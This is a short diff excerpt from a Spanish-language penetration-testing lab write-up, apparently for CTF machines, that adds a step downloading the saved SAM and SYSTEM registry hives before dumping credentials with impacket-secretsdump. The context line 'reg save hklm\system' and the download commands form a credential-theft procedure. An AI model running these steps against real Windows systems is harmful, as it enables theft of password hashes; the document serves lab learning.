@@ -187,6 +187,10 @@ reg save hklm\system c:\Temp\system
 ```
 ![[Cicada20.png]]
 
+Con el comando ``download sam`` y ``download system`` voy a descargar los archivos a mi maquina
+
+![[Return21.png]]
+
 ## Con [[impacket-secretsdump]] vamos a abrir los archivos y que nos dumpee la informacion
 
 ```shell
